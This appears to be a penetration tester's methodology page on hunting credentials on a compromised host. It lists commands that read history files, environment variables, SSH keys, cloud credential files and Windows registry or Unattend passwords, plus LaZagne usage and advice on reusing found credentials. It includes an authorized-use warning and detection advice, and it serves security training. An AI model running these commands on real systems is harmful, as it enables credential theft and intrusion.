# Exfiltration of secrets

Credential hunting on a host you already have a shell on: history files, shell config, environment, and the usual places apps leave passwords. Found creds get reused elsewhere ([password spraying](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md), [SMB](../Protocols/smb.md), [AD](../AD/README.md)) or cracked offline — credential reuse is how one foothold becomes many.

> Authorized testing only. Creds you find are **client data** — handle them per your engagement's rules, record where each came from in `evidence/credentials/`, and never paste them into a chat tool or pastebin.

## Contents

- [Shell history](#shell-history)
- [Environment & exported variables](#environment--exported-variables)
- [Config files & the grep sweep](#config-files--the-grep-sweep)
- [Windows-specific locations](#windows-specific-locations)
- [LaZagne — automate it](#lazagne--automate-it)
- [Where found creds go next](#where-found-creds-go-next)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Shell history

People type passwords into commands. History files are the first place to look.

```bash
# Linux — current and all users
cat ~/.bash_history ~/.zsh_history ~/.ash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
history                                 # in-memory history of the current shell
# other shells / tools that log
cat ~/.python_history ~/.mysql_history ~/.psql_history ~/.rediscli_history 2>/dev/null
cat ~/.local/share/*/history* 2>/dev/null
```

```powershell
# Windows PowerShell — PSReadLine logs EVERY command typed, across sessions, to a flat file:
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
#   = C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadlineOption).HistorySavePath      # the exact path, whatever it is
# legacy cmd doesn't persist history, but check Get-History for the current session
```

PSReadLine history is the Windows goldmine — it survives logoff and routinely contains passwords passed to `net use`, `runas`, `-AsPlainText`, install scripts, etc.

## Environment & exported variables

Secrets are often injected as env vars (DB URLs, API keys, tokens) — especially in containers and CI.

```bash
env; export -p; set            # current environment
cat /proc/self/environ | tr '\0' '\n'          # this process's env
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|key|token|secret'   # every readable proc
# persistent definitions
cat ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc /etc/environment 2>/dev/null
```

```powershell
Get-ChildItem Env: | Format-List                # Windows environment
gci env: | ? { $_.Name -match 'key|token|pass|secret' }
```

## Config files & the grep sweep

The broad net — grep readable files for secret-shaped strings.

```bash
# recursive, case-insensitive, quiet about permission errors
grep -rniE 'password|passwd|pwd|secret|api[_-]?key|token|BEGIN (RSA|OPENSSH|EC) PRIVATE KEY' \
     /etc /home /opt /var/www 2>/dev/null | grep -vE '\.(min\.js|map):'

# high-value files by name
find / \( -name '*.conf' -o -name '*.config' -o -name '*.ini' -o -name '*.env' \
       -o -name '.env' -o -name '*.yml' -o -name '*.yaml' -o -name '*.xml' \
       -o -name 'id_rsa' -o -name '*.pem' -o -name '*.ppk' \
       -o -name 'credentials' -o -name '.git-credentials' -o -name '.netrc' \) 2>/dev/null

# app-specific stores worth a direct look
cat /var/www/html/wp-config.php 2>/dev/null            # WordPress DB creds
cat ~/.aws/credentials ~/.config/gcloud/*.json 2>/dev/null   # cloud keys
cat ~/.git-credentials; cat ~/.netrc 2>/dev/null       # plaintext git/ftp creds
cat /home/*/.ssh/id_rsa 2>/dev/null                    # SSH keys — see general.md
```

```cmd
:: Windows — search file contents and the registry
findstr /si "password passwd pwd" C:\*.txt C:\*.ini C:\*.config C:\*.xml 2>nul
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
:: unattended-install files (often contain a local admin password)
type C:\Windows\Panther\Unattend.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul
:: saved Windows credentials
cmdkey /list
```

## Windows-specific locations

| Source | Where / how |
| --- | --- |
| PSReadLine history | `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| Credential Manager | `cmdkey /list`, then reuse with `runas /savecred` |
| Unattend / Sysprep | `C:\Windows\Panther\Unattend.xml`, `…\Sysprep\unattend.xml` (base64 password) |
| Group Policy Preferences | `cpassword` in SYSVOL XML — AES-decryptable (`gpp-decrypt`) |
| IIS / web.config | `C:\inetpub\wwwroot\web.config` — connection strings |
| Registry autologon | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` → `DefaultPassword` |
| Saved WiFi | `netsh wlan show profile <name> key=clear` |
| Browser / app stores | [LaZagne](#lazagne--automate-it) |

## LaZagne — automate it

[LaZagne](https://github.com/AlessandroZ/LaZagne) (AlessandroZ) is the go-to for automated credential recovery — it knows where dozens of applications store passwords and extracts them in one run. Windows, Linux and Mac.

```bash
# Windows
laZagne.exe all                       # every module
laZagne.exe browsers                  # one category
laZagne.exe browsers -firefox         # one application
laZagne.exe all -oN                   # write results to a file (-oA for all formats)
laZagne.exe all -quiet -oA            # quiet, saved

# Linux / Mac
python lazagne.py all
laZagne all -i                        # interactive (Mac often needs the user password)
```

Categories: **browsers, chats, databases, games, git, mails, maven, memory, multimedia, php, svn, sysadmin, wifi**, and internal OS stores. Admin/root is required for wifi and OS secrets; everything else runs as the current user. [winPEAS/linPEAS](PEASS.md) also hunt creds, but LaZagne goes deeper into app-specific stores.

Other hunters worth knowing: **mimikatz** (Windows LSASS/DPAPI — live creds and hashes, see [AD → Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md)), **trufflehog** / **gitleaks** (secrets in git history), **SharpDPAPI** (DPAPI blobs).

## Where found creds go next

| You found | Do |
| --- | --- |
| A plaintext password | Try it everywhere — SSH, [SMB](../Protocols/smb.md), [WinRM/RDP](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md), the DB; people reuse |
| A password hash | Crack offline → [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) |
| An SSH private key | `chmod 600`, `ssh -i` — see [general → SSH keys](general.md#ssh-keys) |
| A cloud key (`.aws`, gcloud) | Enumerate the cloud account (out of host scope — confirm first) |
| A domain credential | Spray carefully (check lockout policy), then [AD](../AD/README.md) |

Record each in `evidence/credentials/` **with where it came from** — a credential with no provenance can't go in the report.

## Defense / detection

- Secrets in history/config/env are a hygiene failure: use a secrets manager, keep creds out of command lines (they land in history and `ps`), and rotate anything that ever touched a repo or a shared host.
- LaZagne and mimikatz binaries hit AV signatures; mimikatz touching LSASS is a classic EDR trigger. Mass reads of config files and history from one process is the host-side signal.
- Clear PSReadLine history / disable it for privileged sessions; set `HISTCONTROL`/`HISTIGNORE` won't save you — assume anything typed is logged.
- See [Abnormal User Behavior](../../Defense/SOC2/Abnormal%20User%20Behavior.md), [Host-based logging on Linux](../../Defense/Logging/Host-based/Linux.md) / [Windows](../../Defense/Logging/Host-based/Windows.md), and the GPP `cpassword` fix in [3. Active Directory Hardening](../../Defense/System%20and%20Services%20Hardening/3.%20Active%20Directory%20Hardening.md).

## Related

[folder README](README.md) · [general](general.md) · [PEASS](PEASS.md) · [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) · [AD → Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) · [smb](../Protocols/smb.md)
